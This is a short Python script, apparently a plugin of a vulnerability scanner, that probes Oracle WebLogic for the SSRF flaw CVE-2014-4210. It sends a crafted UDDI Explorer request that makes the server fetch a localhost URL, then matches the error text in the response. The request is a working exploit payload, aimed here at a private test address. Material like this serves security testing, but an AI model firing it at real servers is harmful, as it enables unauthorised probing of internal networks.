from typing import Optional

import requests

from lib.log import logger


def run(url: str) -> Optional[str]:
    """Exploit WebLogic SSRF vulnerability (CVE-2014-4210)."""
    payload = ":7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
    target_url = f"{url}{payload}"

    try:
        logger.info(f"Testing SSRF at {target_url}")
        response = requests.get(target_url, verify=False, timeout=10)
        if "weblogic.uddi.client.structures.exception.XML_SoapException" in response.text and "IO Exception on sendMessage" not in response.text:
            logger.success("WebLogic SSRF Vulnerable")
            return "WebLogic SSRF Vulnerable"
        logger.warning(f"Failed, response does not match criteria")
        return None
    except requests.RequestException as e:
        logger.error(f"Request failed: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None


if __name__ == "__main__":
    print(run("http://192.168.27.128"))
